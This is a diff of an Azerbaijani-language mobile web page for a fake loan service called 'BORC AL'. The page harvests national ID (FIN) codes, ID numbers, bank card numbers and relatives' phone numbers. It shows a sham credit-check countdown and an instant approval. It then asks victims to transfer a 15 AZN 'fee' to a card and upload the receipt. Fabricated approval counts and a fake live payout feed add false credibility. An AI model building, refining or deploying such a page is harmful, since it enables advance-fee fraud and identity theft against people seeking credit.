@@ -1,4 +1,3 @@
-```html
 <!DOCTYPE html>
 <html lang="az">
 <head>
@@ -8,752 +7,454 @@
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
     <style>
         :root {
-            --bg-main: #060d26;
-            --bg-card: #0d1b3e;
-            --bg-input: #132454;
-            --accent-blue: #00d2ff;
-            --accent-purple: #7000ff;
-            --accent-green: #00e676;
-            --text-light: #ffffff;
-            --text-dim: #94a3b8;
-            --border-glow: rgba(0, 210, 255, 0.3);
+            --bg-dark: #080d1a;
+            --card-bg: #0f172a;
+            --input-bg: #1e293b;
+            --accent-blue: #38bdf8;
+            --accent-glow: #0284c7;
+            --text-main: #f8fafc;
+            --text-sub: #94a3b8;
+            --green: #10b981;
         }
 
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
-        body { background-color: var(--bg-main); color: var(--text-light); padding-bottom: 80px; min-height: 100vh; }
-        
-        .container { max-width: 480px; margin: 0 auto; padding: 15px; }
+        body { background-color: var(--bg-dark); color: var(--text-main); padding-bottom: 90px; min-height: 100vh; }
 
-        /* Modern Top Bar / Header */
-        header {
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            padding: 15px 5px;
-            margin-bottom: 15px;
+        .app-header {
+            display: flex; align-items: center; justify-content: space-between;
+            padding: 18px 20px; background: rgba(15, 23, 42, 0.9);
+            backdrop-filter: blur(10px); border-bottom: 1px solid rgba(255,255,255,0.05);
+            position: sticky; top: 0; z-index: 100;
         }
 
-        .logo {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            font-size: 1.5rem;
-            font-weight: 800;
-            letter-spacing: 1px;
-            background: linear-gradient(135deg, #00d2ff, #0055ff);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
+        .brand-logo { display: flex; align-items: center; gap: 10px; text-decoration: none; }
+        .logo-icon {
+            width: 38px; height: 38px; background: linear-gradient(135deg, #0284c7, #38bdf8);
+            border-radius: 10px; display: flex; align-items: center; justify-content: center;
+            font-weight: bold; font-size: 1.2rem; color: white;
+            box-shadow: 0 0 15px rgba(56, 189, 248, 0.4);
+            animation: pulse 2s infinite ease-in-out;
         }
 
-        .animated-logo-icon {
-            font-size: 1.8rem;
-            color: var(--accent-blue);
-            animation: pulse-glow 2s infinite ease-in-out;
-            -webkit-text-fill-color: initial;
+        @keyframes pulse {
+            0% { box-shadow: 0 0 0 0 rgba(56, 189, 248, 0.7); }
+            70% { box-shadow: 0 0 0 12px rgba(56, 189, 248, 0); }
+            100% { box-shadow: 0 0 0 0 rgba(56, 189, 248, 0); }
         }
 
-        @keyframes pulse-glow {
-            0% { transform: scale(1); filter: drop-shadow(0 0 2px var(--accent-blue)); }
-            50% { transform: scale(1.15); filter: drop-shadow(0 0 10px var(--accent-blue)); }
-            100% { transform: scale(1); filter: drop-shadow(0 0 2px var(--accent-blue)); }
-        }
+        .brand-text { font-size: 1.3rem; font-weight: 800; color: white; letter-spacing: 0.5px; }
+        .brand-text span { color: var(--accent-blue); font-size: 0.75rem; display: block; font-weight: 400; }
 
-        /* Hero banner */
-        .hero-banner {
-            background: linear-gradient(135deg, #0d2354, #180d3e);
-            border-radius: 20px;
-            padding: 20px;
-            text-align: center;
-            border: 1px solid var(--border-glow);
-            box-shadow: 0 10px 30px rgba(0,0,0,0.4);
-            margin-bottom: 20px;
-            position: relative;
-            overflow: hidden;
-        }
+        .container { max-width: 480px; margin: 0 auto; padding: 20px 15px; }
+        .tab-content { display: none; }
+        .tab-content.active { display: block; }
 
-        .hero-banner h1 {
-            font-size: 1.3rem;
-            font-weight: 800;
-            line-height: 1.4;
-            margin-bottom: 8px;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-        }
-
-        .hero-banner p {
-            font-size: 0.85rem;
-            color: var(--text-dim);
-        }
-
-        /* Features row */
-        .features-row {
-            display: grid;
-            grid-template-columns: repeat(3, 1fr);
-            gap: 10px;
-            margin-bottom: 20px;
-        }
-
-        .feat-item {
-            background: var(--bg-card);
-            border: 1px solid rgba(255,255,255,0.05);
-            padding: 12px 8px;
-            border-radius: 16px;
-            text-align: center;
-            font-size: 0.72rem;
-            color: var(--text-dim);
-        }
-
-        .feat-item i {
-            font-size: 1.3rem;
-            color: var(--accent-blue);
-            margin-bottom: 6px;
-            display: block;
-        }
-
-        /* Forms & Cards */
-        .card {
-            background: var(--bg-card);
-            border-radius: 20px;
-            padding: 20px;
+        .form-card {
+            background: var(--card-bg); border-radius: 20px; padding: 22px;
             border: 1px solid rgba(255, 255, 255, 0.08);
-            box-shadow: 0 15px 35px rgba(0,0,0,0.3);
-            margin-bottom: 20px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.5); margin-bottom: 25px;
         }
 
-        .card h2 {
-            font-size: 1.1rem;
-            margin-bottom: 18px;
-            color: var(--text-light);
-            display: flex;
-            align-items: center;
-            gap: 10px;
-        }
+        .form-title { font-size: 1.2rem; font-weight: 700; margin-bottom: 20px; display: flex; align-items: center; gap: 10px; color: white; }
+        .form-title i { color: var(--accent-blue); }
 
-        .form-group {
-            margin-bottom: 15px;
-        }
-
-        .form-group label {
-            display: block;
-            font-size: 0.8rem;
-            color: var(--text-dim);
-            margin-bottom: 6px;
-            font-weight: 600;
-        }
+        .field-group { margin-bottom: 16px; }
+        .field-label { display: block; font-size: 0.85rem; color: var(--text-sub); margin-bottom: 8px; font-weight: 500; }
 
         .input-box {
-            position: relative;
-            display: flex;
-            align-items: center;
+            display: flex; align-items: center; background: var(--input-bg);
+            border: 1.5px solid rgba(255,255,255,0.1); border-radius: 12px;
+            padding: 0 14px; transition: 0.3s;
         }
-
-        .input-box i {
-            position: absolute;
-            left: 15px;
-            color: var(--accent-blue);
-            font-size: 1rem;
-        }
-
+        .input-box:focus-within { border-color: var(--accent-blue); box-shadow: 0 0 10px rgba(56, 189, 248, 0.2); }
+        .input-box i { color: var(--accent-blue); font-size: 1.1rem; width: 25px; }
         .input-box input, .input-box select {
-            width: 100%;
-            background: var(--bg-input);
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            color: #fff;
-            padding: 14px 14px 14px 45px;
-            border-radius: 12px;
-            font-size: 0.95rem;
-            outline: none;
-            transition: all 0.3s;
+            width: 100%; background: transparent; border: none; padding: 14px 10px;
+            color: white; font-size: 0.95rem; outline: none;
         }
 
-        .input-box input:focus, .input-box select:focus {
-            border-color: var(--accent-blue);
-            box-shadow: 0 0 10px rgba(0, 210, 255, 0.2);
-        }
-
-        /* Series Select Buttons (AA, AB, AZE) */
-        .series-selector {
-            display: flex;
-            gap: 8px;
-            margin-bottom: 15px;
-        }
-
+        .series-selector { display: flex; gap: 8px; margin-bottom: 15px; }
         .series-btn {
-            flex: 1;
-            padding: 12px;
-            background: var(--bg-input);
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            color: white;
-            border-radius: 12px;
-            cursor: pointer;
-            text-align: center;
-            font-weight: bold;
-            font-size: 0.9rem;
-            transition: 0.2s;
+            flex: 1; padding: 12px; background: var(--input-bg); border: 1px solid rgba(255,255,255,0.1);
+            color: var(--text-sub); border-radius: 12px; font-weight: 600; cursor: pointer; text-align: center;
         }
+        .series-btn.active { background: linear-gradient(135deg, #0284c7, #38bdf8); color: white; border: none; }
 
-        .series-btn.active {
-            background: linear-gradient(135deg, var(--accent-blue), #0055ff);
-            border-color: var(--accent-blue);
-            box-shadow: 0 0 10px rgba(0, 210, 255, 0.3);
-        }
-
-        /* Gender selector */
-        .gender-box {
-            display: flex;
-            gap: 10px;
-            margin-bottom: 15px;
-        }
-
+        .gender-selector { display: flex; gap: 10px; }
         .gender-btn {
-            flex: 1;
-            background: var(--bg-input);
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            color: white;
-            padding: 12px;
-            border-radius: 12px;
-            text-align: center;
-            cursor: pointer;
-            font-size: 0.9rem;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 8px;
+            flex: 1; padding: 12px; background: var(--input-bg); border: 1px solid rgba(255,255,255,0.1);
+            color: white; border-radius: 12px; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 8px;
+        }
+        .gender-btn.active { border-color: var(--accent-blue); background: rgba(56, 189, 248, 0.15); }
+
+        .btn-submit {
+            width: 100%; background: linear-gradient(135deg, #0284c7, #38bdf8);
+            color: white; border: none; padding: 16px; border-radius: 14px;
+            font-size: 1rem; font-weight: 700; cursor: pointer; margin-top: 15px;
+            box-shadow: 0 10px 20px rgba(2, 132, 199, 0.3); transition: 0.2s;
+        }
+        .btn-submit:active { transform: scale(0.98); }
+
+        /* Müraciətlər Vərəqi & Animasiyalı Canlı Siyahı */
+        .stat-card {
+            background: linear-gradient(135deg, #0284c7, #0369a1);
+            border-radius: 16px; padding: 20px; text-align: center; margin-bottom: 20px;
+        }
+        .stat-num { font-size: 2.2rem; font-weight: 900; color: white; }
+        .stat-desc { font-size: 0.85rem; color: rgba(255,255,255,0.8); margin-top: 4px; }
+
+        .live-feed-box {
+            background: var(--card-bg); border-radius: 16px; padding: 15px;
+            border: 1px solid rgba(255,255,255,0.08); height: 350px; overflow: hidden; position: relative;
         }
 
-        .gender-btn.active {
-            border-color: var(--accent-blue);
-            background: rgba(0, 210, 255, 0.15);
+        .feed-container {
+            animation: scroll-up 18s linear infinite;
+        }
+        .feed-container:hover { animation-play-state: paused; }
+
+        @keyframes scroll-up {
+            0% { transform: translateY(0); }
+            100% { transform: translateY(-50%); }
         }
 
-        /* Button */
-        .btn-action {
-            width: 100%;
-            padding: 16px;
-            background: linear-gradient(135deg, #00d2ff, #0055ff);
-            border: none;
-            border-radius: 14px;
-            color: white;
-            font-size: 1rem;
-            font-weight: 700;
-            cursor: pointer;
-            box-shadow: 0 8px 20px rgba(0, 210, 255, 0.3);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 10px;
-            transition: transform 0.2s;
+        .feed-item {
+            display: flex; justify-content: space-between; align-items: center;
+            padding: 12px 10px; border-bottom: 1px solid rgba(255,255,255,0.05);
         }
+        .feed-user { font-weight: 600; font-size: 0.9rem; }
+        .feed-amount { color: var(--green); font-weight: 700; font-size: 0.9rem; }
+        .feed-time { font-size: 0.75rem; color: var(--text-sub); }
 
-        .btn-action:active { transform: scale(0.98); }
-
-        /* Loader Overlay */
-        .timer-container {
-            text-align: center;
-            padding: 30px 10px;
+        /* Animasiyalı App Store / Google Play Bölməsi */
+        .apps-banner {
+            background: var(--card-bg); border-radius: 20px; padding: 20px; text-align: center;
+            border: 1px solid rgba(255,255,255,0.08); margin-top: 30px;
         }
-
-        .pulse-loader {
-            width: 80px;
-            height: 80px;
-            margin: 0 auto 20px;
-            border-radius: 50%;
-            background: rgba(0, 210, 255, 0.1);
-            border: 3px solid var(--accent-blue);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 1.8rem;
-            color: var(--accent-blue);
-            box-shadow: 0 0 20px rgba(0, 210, 255, 0.4);
-            animation: pulse-ring 1.5s infinite;
+        .apps-title { font-size: 1rem; font-weight: 700; margin-bottom: 15px; color: white; }
+        .app-buttons { display: flex; gap: 12px; }
+        .app-btn {
+            flex: 1; background: var(--input-bg); border: 1px solid rgba(255,255,255,0.15);
+            padding: 12px; border-radius: 12px; color: white; text-decoration: none;
+            display: flex; align-items: center; justify-content: center; gap: 10px;
+            transition: all 0.3s ease; animation: glow-pulse 3s infinite alternate;
         }
-
-        @keyframes pulse-ring {
-            0% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(0, 210, 255, 0.7); }
-            70% { transform: scale(1); box-shadow: 0 0 0 15px rgba(0, 210, 255, 0); }
-            100% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(0, 210, 255, 0); }
+        @keyframes glow-pulse {
+            0% { border-color: rgba(255,255,255,0.15); box-shadow: 0 0 0px transparent; }
+            100% { border-color: var(--accent-blue); box-shadow: 0 0 12px rgba(56, 189, 248, 0.3); }
         }
+        .app-btn i { font-size: 1.5rem; color: var(--accent-blue); }
+        .app-btn-text { text-align: left; }
+        .app-btn-text small { display: block; font-size: 0.65rem; color: var(--text-sub); }
+        .app-btn-text span { font-size: 0.85rem; font-weight: bold; }
 
-        /* Animated Bank Card Visual */
-        .card-visual-box {
-            perspective: 1000px;
-            margin: 20px 0;
-        }
-
-        .real-card-ui {
-            background: linear-gradient(135deg, #0f1f4b, #1e0b36, #0055ff);
-            border-radius: 18px;
-            padding: 22px;
-            border: 1px solid rgba(255, 255, 255, 0.2);
-            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.5);
-            position: relative;
-            overflow: hidden;
-            animation: float-card 4s ease-in-out infinite;
-        }
-
-        @keyframes float-card {
-            0% { transform: translateY(0) rotateX(0deg); }
-            50% { transform: translateY(-8px) rotateX(5deg); }
-            100% { transform: translateY(0) rotateX(0deg); }
-        }
-
-        .card-chip {
-            width: 42px;
-            height: 30px;
-            background: linear-gradient(135deg, #ffd700, #ffa500);
-            border-radius: 6px;
-            margin-bottom: 20px;
-        }
-
-        .card-number-text {
-            font-size: 1.25rem;
-            font-weight: 700;
-            letter-spacing: 2px;
-            margin-bottom: 15px;
-            font-family: monospace;
-            color: #fff;
-            text-shadow: 0 2px 4px rgba(0,0,0,0.8);
-        }
-
-        /* Bottom Fixed Navigation Bar */
+        /* Bottom Nav Bar */
         .bottom-nav {
-            position: fixed;
-            bottom: 0;
-            left: 0;
-            right: 0;
-            background: #081230;
+            position: fixed; bottom: 0; left: 0; right: 0;
+            background: rgba(15, 23, 42, 0.95); backdrop-filter: blur(15px);
             border-top: 1px solid rgba(255,255,255,0.08);
-            display: flex;
-            justify-content: space-around;
-            padding: 10px 0;
-            z-index: 99;
+            display: flex; justify-content: space-around; padding: 10px 0; z-index: 1000;
         }
-
         .nav-item {
-            text-align: center;
-            color: var(--text-dim);
-            font-size: 0.7rem;
-            text-decoration: none;
+            color: var(--text-sub); text-decoration: none; display: flex;
+            flex-direction: column; align-items: center; gap: 4px; font-size: 0.75rem;
+            cursor: pointer; flex: 1;
         }
+        .nav-item i { font-size: 1.2rem; }
+        .nav-item.active { color: var(--accent-blue); }
 
-        .nav-item i {
-            font-size: 1.2rem;
-            display: block;
-            margin-bottom: 3px;
-        }
-
-        .nav-item.active {
-            color: var(--accent-blue);
-        }
-
-        #step2, #step3, #step4, #step5, #loader1, #loader2 { display: none; }
+        #step2, #step3, #step4, #loader1, #loader2 { display: none; }
     </style>
 </head>
 <body>
 
-<div class="container">
-    <header>
-        <div class="logo">
-            <i class="fa-solid fa-bolt animated-logo-icon"></i>
-            <span>BORC AL</span>
-        </div>
-        <div style="font-size: 0.75rem; background: rgba(0,210,255,0.1); color: var(--accent-blue); padding: 5px 10px; border-radius: 20px; border: 1px solid rgba(0,210,255,0.2);">
-            Rəsmi Onlayn Portal
-        </div>
+    <header class="app-header">
+        <a href="#" class="brand-logo">
+            <div class="logo-icon"><i class="fa-solid fa-bolt"></i></div>
+            <div class="brand-text">BORC AL <span>KREDİT SİSTEMİ</span></div>
+        </a>
     </header>
 
-    <div class="hero-banner">
-        <h1>RƏSMİ GƏLİR İSTƏNİLMİR<br><span style="color: var(--accent-blue);">GECİKMƏYƏ BAXILMIR</span></h1>
-        <p>Sizin üçün daha əlçatan kredit imkanları</p>
+    <div class="container">
+
+        <!-- TAB 1: ANA SƏHİFƏ / FORM -->
+        <div id="tab-home" class="tab-content active">
+
+            <!-- STEP 1: QEYDİYYAT -->
+            <div class="form-card" id="step1">
+                <div class="form-title"><i class="fa-solid fa-user-plus"></i> Müraciət Qeydiyyatı</div>
+                <form onsubmit="startFirstCheck(event)">
+                    <div class="field-group">
+                        <label class="field-label">Adınız</label>
+                        <div class="input-box"><i class="fa-solid fa-user"></i><input type="text" id="uName" placeholder="Məs: Əli" required></div>
+                    </div>
+                    <div class="field-group">
+                        <label class="field-label">Soyadınız</label>
+                        <div class="input-box"><i class="fa-solid fa-user"></i><input type="text" id="uSurname" placeholder="Məs: Məmmədov" required></div>
+                    </div>
+                    <div class="field-group">
+                        <label class="field-label">Əlaqə Nömrəsi</label>
+                        <div class="input-box"><i class="fa-solid fa-phone"></i><input type="tel" id="uPhone" placeholder="050 000 00 00" required></div>
+                    </div>
+                    <div class="field-group">
+                        <label class="field-label">FIN Kodunuz</label>
+                        <div class="input-box"><i class="fa-solid fa-id-badge"></i><input type="text" id="uFin" placeholder="7 SİMVOL (MƏS: 7ABC123)" maxlength="7" required></div>
+                    </div>
+
+                    <div class="field-group">
+                        <label class="field-label">Şəxsiyyət Vəsiqəsinin Seriyası</label>
+                        <div class="series-selector">
+                            <div class="series-btn active" onclick="selectSeries(this, 'AZE')">AZE</div>
+                            <div class="series-btn" onclick="selectSeries(this, 'AA')">AA</div>
+                            <div class="series-btn" onclick="selectSeries(this, 'AB')">AB</div>
+                        </div>
+                        <input type="hidden" id="selectedSeriesVal" value="AZE">
+                    </div>
+
+                    <div class="field-group">
+                        <label class="field-label">Vəsiqənin Seriya Nömrəsi</label>
+                        <div class="input-box"><i class="fa-solid fa-hashtag"></i><input type="text" id="uSeria" placeholder="12345678" maxlength="8" required></div>
+                    </div>
+
+                    <div class="field-group">
+                        <label class="field-label">Cinsiniz</label>
+                        <div class="gender-selector">
+                            <div class="gender-btn active" onclick="selectGender(this, 'Bəy')">👨 Bəy</div>
+                            <div class="gender-btn" onclick="selectGender(this, 'Xanım')">👩 Xanım</div>
+                        </div>
+                        <input type="hidden" id="selectedGenderVal" value="Bəy">
+                    </div>
+
+                    <button type="submit" class="btn-submit">Başla və Kredit Limitini Yoxla &rarr;</button>
+                </form>
+            </div>
+
+            <!-- GÖZLƏMƏ 1: 30 SANİYƏ -->
+            <div class="form-card" id="loader1" style="text-align: center; padding: 40px 20px;">
+                <i class="fa-solid fa-spinner fa-spin" style="font-size: 3rem; color: var(--accent-blue);"></i>
+                <h3 style="margin-top: 20px;">Məlumatlar Yoxlanılır...</h3>
+                <p style="color: var(--text-sub); font-size: 0.85rem; margin-top: 8px;">Kredit reyestri sorğulanır.</p>
+                <div style="font-size: 2.5rem; font-weight: bold; color: var(--accent-blue); margin: 15px 0;" id="timerCount">30</div>
+            </div>
+
+            <!-- STEP 2: LİMİT SEÇİMİ -->
+            <div class="form-card" id="step2">
+                <div class="form-title"><i class="fa-solid fa-circle-check" style="color:var(--green)"></i> Limitiniz Ayrıldı!</div>
+                <div style="text-align: center; padding: 15px; background: rgba(16, 185, 129, 0.1); border-radius: 12px; margin-bottom: 20px;">
+                    <span style="font-size: 0.85rem; color: var(--text-sub);">Maksimum Ayrılan Kredit:</span>
+                    <div style="font-size: 2rem; font-weight: 800; color: var(--green);" id="maxApprovedAmount">2500 AZN</div>
+                </div>
+                <div class="field-group">
+                    <label class="field-label">Götürmək istədiyiniz məbləğ: <strong id="selectedValText" style="color:var(--accent-blue)">1000 AZN</strong></label>
+                    <input type="range" id="loanRange" min="50" max="4000" step="50" value="1000" style="width: 100%; margin: 10px 0;" oninput="updateLoanCalc(this.value)">
+                </div>
+                <button type="button" class="btn-submit" onclick="goToStep3()">Davam Et &rarr;</button>
+            </div>
+
+            <!-- STEP 3: ƏLAVƏ FORM -->
+            <div class="form-card" id="step3">
+                <div class="form-title"><i class="fa-solid fa-file-invoice"></i> Əlavə Məlumatlar</div>
+                <form onsubmit="startSecondCheck(event)">
+                    <div class="field-group"><label class="field-label">Kart Nömrəniz (Kredit köçəcək)</label><div class="input-box"><i class="fa-solid fa-credit-card"></i><input type="text" placeholder="4169 0000 0000 0000" maxlength="19" required></div></div>
+                    <div class="field-group"><label class="field-label">Doğum Tarixi</label><div class="input-box"><i class="fa-solid fa-calendar"></i><input type="date" required></div></div>
+                    <div class="field-group"><label class="field-label">İş Yeri / Vəzifə</label><div class="input-box"><i class="fa-solid fa-briefcase"></i><input type="text" placeholder="Şirkət adı və vəzifə" required></div></div>
+                    <div class="field-group"><label class="field-label">Yaşadığınız Şəhər</label><div class="input-box"><i class="fa-solid fa-location-dot"></i><input type="text" placeholder="Bakı" required></div></div>
+                    <div class="field-group"><label class="field-label">1-ci Qohum (Ad, Soyad, Tel)</label><div class="input-box"><i class="fa-solid fa-users"></i><input type="text" placeholder="Məs: Əli Əliyev 0501234567" required></div></div>
+                    <div class="field-group"><label class="field-label">2-ci Qohum (Ad, Soyad, Tel)</label><div class="input-box"><i class="fa-solid fa-users"></i><input type="text" placeholder="Məs: Vəli Məmmədov 0551234567" required></div></div>
+                    <button type="submit" class="btn-submit">Təsdiqlə &rarr;</button>
+                </form>
+            </div>
+
+            <!-- GÖZLƏMƏ 2 -->
+            <div class="form-card" id="loader2" style="text-align: center; padding: 40px 20px;">
+                <i class="fa-solid fa-circle-notch fa-spin" style="font-size: 3rem; color: var(--accent-blue);"></i>
+                <h3 style="margin-top: 20px;">Ödəniş Sisteminə Yönləndirilir...</h3>
+            </div>
+
+            <!-- STEP 4: ÖDƏNİŞ & ÇEK -->
+            <div class="form-card" id="step4">
+                <div class="form-title"><i class="fa-solid fa-receipt"></i> Rəsmiləşdirmə Ödənişi</div>
+                <p style="font-size: 0.85rem; color: var(--text-sub); margin-bottom: 15px;">Xidmət haqqı olan <strong>15 AZN</strong> məbləğini aşağıdakı karta köçürüb çeki yükləyin:</p>
+                <div style="background: var(--input-bg); border-radius: 12px; padding: 15px; text-align: center; font-size: 1.2rem; font-weight: bold; letter-spacing: 1px; margin-bottom: 15px; color: var(--accent-blue);" id="displayCardNumber">Yüklənir...</div>
+                <div class="field-group">
+                    <label class="field-label">Ödəniş Çekini Yükləyin</label>
+                    <input type="file" id="receiptFile" accept="image/*,.pdf" style="color: white;">
+                </div>
+                <button type="button" class="btn-submit" onclick="finishProcess()">Çeki Göndər</button>
+            </div>
+
+            <!-- STEP 5: BİTDİ -->
+            <div class="form-card" id="step5" style="text-align: center;">
+                <i class="fa-solid fa-circle-check" style="font-size: 4rem; color: var(--green); margin-bottom: 15px;"></i>
+                <h2>Təbriklər! Uğurla Tamamlandı</h2>
+                <p style="font-size: 0.9rem; color: var(--text-sub); margin-top: 10px;">Ödəniş çeki qəbul edildi. Kredit məbləği <strong>5 dəqiqə ərzində</strong> kartınıza köçürüləcəkdir.</p>
+            </div>
+
+            <!-- Animasiyalı Mobile App Bölməsi -->
+            <div class="apps-banner">
+                <div class="apps-title"><i class="fa-solid fa-mobile-screen-button"></i> Mobil Tətbiqimizi Yükləyin</div>
+                <div class="app-buttons">
+                    <a href="#" class="app-btn">
+                        <i class="fa-brands fa-google-play"></i>
+                        <div class="app-btn-text"><small>ƏLDƏ EDİN</small><span>Google Play</span></div>
+                    </a>
+                    <a href="#" class="app-btn">
+                        <i class="fa-brands fa-apple"></i>
+                        <div class="app-btn-text"><small>YÜKLƏYİN</small><span>App Store</span></div>
+                    </a>
+                </div>
+            </div>
+
+        </div>
+
+        <!-- TAB 2: MÜRACİƏTLƏR (200K CANLI AXIN) -->
+        <div id="tab-requests" class="tab-content">
+            <div class="stat-card">
+                <div class="stat-num">200,000+</div>
+                <div class="stat-desc">Uğurla Təsdiqlənmiş Onlayn Kredit Müraciəti</div>
+            </div>
+
+            <h4 style="margin-bottom: 12px; font-size: 0.95rem; color: var(--text-sub);"><i class="fa-solid fa-arrows-rotate fa-spin" style="color:var(--accent-blue)"></i> Canlı Kredit Köçürmələri</h4>
+            <div class="live-feed-box">
+                <div class="feed-container" id="feedList">
+                    <!-- Javascript ilə dolacaq -->
+                </div>
+            </div>
+        </div>
+
+        <!-- TAB 3: ÖDƏNİŞLƏR -->
+        <div id="tab-payments" class="tab-content">
+            <div class="form-card" style="text-align: center; padding: 40px 20px;">
+                <i class="fa-solid fa-wallet" style="font-size: 3rem; color: var(--accent-blue); margin-bottom: 15px;"></i>
+                <h3>Aylıq Ödənişlər</h3>
+                <p style="font-size: 0.85rem; color: var(--text-sub); margin-top: 8px;">Aktiv kredit müqaviləniz tapılmadı.</p>
+            </div>
+        </div>
+
+        <!-- TAB 4: PROFİL -->
+        <div id="tab-profile" class="tab-content">
+            <div class="form-card">
+                <div class="form-title"><i class="fa-solid fa-id-card"></i> Şəxsi Profil</div>
+                <div style="display: flex; flex-direction: column; gap: 12px;" id="profileDetails">
+                    <p style="color: var(--text-sub); font-size: 0.85rem;">Məlumatları görmək üçün ilk növbədə müraciət formunu doldurun.</p>
+                </div>
+            </div>
+        </div>
+
     </div>
 
-    <div class="features-row">
-        <div class="feat-item">
-            <i class="fa-solid fa-shield-halved"></i>
-            Rəsmi gəlir tələb olunmur
-        </div>
-        <div class="feat-item">
-            <i class="fa-solid fa-users"></i>
-            Gecikməniz olsa da olar
-        </div>
-        <div class="feat-item">
-            <i class="fa-solid fa-bolt"></i>
-            Tam onlayn müraciət
-        </div>
-    </div>
+    <!-- Bottom Navigation Bar -->
+    <nav class="bottom-nav">
+        <div class="nav-item active" onclick="switchTab('tab-home', this)"><i class="fa-solid fa-house"></i><span>Ana Səhifə</span></div>
+        <div class="nav-item" onclick="switchTab('tab-requests', this)"><i class="fa-solid fa-file-lines"></i><span>Müraciətlər</span></div>
+        <div class="nav-item" onclick="switchTab('tab-payments', this)"><i class="fa-solid fa-wallet"></i><span>Ödənişlər</span></div>
+        <div class="nav-item" onclick="switchTab('tab-profile', this)"><i class="fa-solid fa-user"></i><span>Profil</span></div>
+    </nav>
 
-    <!-- MƏRHƏLƏ 1: QEYDİYYAT -->
-    <div class="card" id="step1">
-        <h2><i class="fa-solid fa-user-plus" style="color: var(--accent-blue);"></i> Müraciət Qeydiyyatı</h2>
-        <form onsubmit="startFirstCheck(event)">
-            <div class="form-group">
-                <label>Adınız</label>
-                <div class="input-box">
-                    <i class="fa-solid fa-user"></i>
-                    <input type="text" placeholder="Məs: Əli" required>
-                </div>
-            </div>
-
-            <div class="form-group">
-                <label>Soyadınız</label>
-                <div class="input-box">
-                    <i class="fa-solid fa-user-tag"></i>
-                    <input type="text" placeholder="Məs: Məmmədov" required>
-                </div>
-            </div>
-
-            <div class="form-group">
-                <label>Əlaqə Nömrəsi</label>
-                <div class="input-box">
-                    <i class="fa-solid fa-phone"></i>
-                    <input type="tel" placeholder="050 000 00 00" required>
-                </div>
-            </div>
-
-            <div class="form-group">
-                <label>FIN Kodunuz</label>
-                <div class="input-box">
-                    <i class="fa-solid fa-id-badge"></i>
-                    <input type="text" placeholder="7 simvol (Məs: 7ABC123)" maxlength="7" style="text-transform: uppercase;" required>
-                </div>
-            </div>
-
-            <div class="form-group">
-                <label>Şəxsiyyət Vəsiqəsinin Seriyası</label>
-                <div class="series-selector">
-                    <div class="series-btn active" onclick="selectSeries('AZE', this)">AZE</div>
-                    <div class="series-btn" onclick="selectSeries('AA', this)">AA</div>
-                    <div class="series-btn" onclick="selectSeries('AB', this)">AB</div>
-                </div>
-                <input type="hidden" id="selectedSeries" value="AZE">
-            </div>
-
-            <div class="form-group">
-                <label>Vəsiqənin Seriya Nömrəsi</label>
-                <div class="input-box">
-                    <i class="fa-solid fa-hashtag"></i>
-                    <input type="text" placeholder="12345678" maxlength="8" required>
-                </div>
-            </div>
-
-            <button type="submit" class="btn-action">
-                <span>Başla və Kredit Limitini Yoxla</span>
-                <i class="fa-solid fa-arrow-right"></i>
-            </button>
-        </form>
-    </div>
-
-    <!-- GÖZLƏMƏ 1: 30 Saniyelik Yoxlanış -->
-    <div class="card" id="loader1">
-        <div class="timer-container">
-            <div class="pulse-loader">
-                <i class="fa-solid fa-gear fa-spin"></i>
-            </div>
-            <h3 style="font-size: 1.2rem; margin-bottom: 8px;">Kredit Limitiniz Hesablanır...</h3>
-            <p style="font-size: 0.85rem; color: var(--text-dim);">Sistem şəxsiyyətinizi təsdiqləyir. Xahiş edirik gözləyin.</p>
-            <div style="font-size: 2.5rem; font-weight: 800; color: var(--accent-blue); margin: 15px 0;" id="timerCount">30</div>
-            <p style="font-size: 0.75rem; color: var(--text-dim);">Səhifəni bağlamayın</p>
-        </div>
-    </div>
-
-    <!-- MƏRHƏLƏ 2: LIMIT VƏ MƏBLƏĞ SEÇİMİ -->
-    <div class="card" id="step2">
-        <div style="background: rgba(0, 230, 118, 0.1); border: 1px solid var(--accent-green); padding: 15px; border-radius: 16px; text-align: center; margin-bottom: 20px;">
-            <i class="fa-solid fa-circle-check" style="font-size: 2rem; color: var(--accent-green); margin-bottom: 5px;"></i>
-            <div style="font-size: 0.85rem; color: var(--text-dim);">Təbriklər! Müraciətiniz Təsdiqləndi</div>
-            <div style="font-size: 1.8rem; font-weight: 800; color: var(--accent-green);" id="maxApprovedAmount">2400 AZN</div>
-        </div>
-
-        <h2><i class="fa-solid fa-sliders" style="color: var(--accent-blue);"></i> Götürəcəyiniz Məbləğ</h2>
-        
-        <div class="form-group" style="margin-top: 15px;">
-            <div style="display: flex; justify-content: space-between; margin-bottom: 10px;">
-                <span style="color: var(--text-dim);">Seçilən Məbləğ:</span>
-                <strong style="color: var(--accent-blue); font-size: 1.3rem;" id="selectedAmountVal">1000 AZN</strong>
-            </div>
-            <input type="range" id="loanRange" min="50" max="4000" step="50" value="1000" style="width: 100%; height: 8px; border-radius: 5px; accent-color: var(--accent-blue);" oninput="updateCalculator(this.value)">
-            <div style="display: flex; justify-content: space-between; font-size: 0.75rem; color: var(--text-dim); margin-top: 5px;">
-                <span>50 AZN</span>
-                <span>4000 AZN</span>
-            </div>
-        </div>
-
-        <div style="background: var(--bg-input); padding: 15px; border-radius: 14px; margin: 20px 0;">
-            <div style="display: flex; justify-content: space-between; font-size: 0.85rem; margin-bottom: 8px;">
-                <span style="color: var(--text-dim);">Kredit Müddəti:</span>
-                <span>12 Ay</span>
-            </div>
